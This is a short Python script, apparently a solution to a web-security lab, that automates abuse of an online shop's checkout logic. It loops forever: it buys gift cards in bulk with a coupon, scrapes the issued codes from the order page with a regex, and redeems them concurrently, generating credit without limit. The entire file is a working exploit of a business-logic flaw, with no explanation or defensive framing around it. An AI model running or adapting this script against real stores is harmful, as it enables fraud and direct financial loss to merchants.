#!/usr/bin/env python3
import request_parser
import re
import concurrent.futures
gift_card_pattern = re.compile(r"<td>(\w\w\w\w\w\w\w\w\w\w)</td>")
while True:
    request_parser.make_request("add_to_cart.txt", data_mod={"quantity": 50})
    request_parser.make_request("add_coupon.txt")
    request_parser.make_request("place_order.txt")
    response = request_parser.make_request("lookup_codes.txt")
    gift_cards = gift_card_pattern.findall(response.text)
    print(gift_cards)
    results = []
    for gift_card in gift_cards:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            r = executor.submit(request_parser.make_request, "redeem_code.txt", data_mod={
                "gift-card": gift_card})
            results.append(r)
            for result in results:
                result = result.result()
